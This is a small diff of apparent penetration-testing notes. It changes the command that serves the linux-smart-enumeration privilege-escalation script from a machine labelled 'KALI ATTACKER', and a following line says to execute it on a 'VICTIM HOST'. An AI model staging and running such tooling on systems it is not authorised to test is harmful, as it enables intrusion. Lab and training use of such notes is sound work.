@@ -4,7 +4,7 @@ https://github.com/diego-treitos/linux-smart-enumeration/tree/master
 
 Host the script on KALI ATTACKER
 ```
-cd ~/Desktop/Tools && python -m http.server 8888
+python -m http.server 8888 --directory ~/Desktop/Tools
 ```
 
 Directly execute into VICTIM HOST terminal 
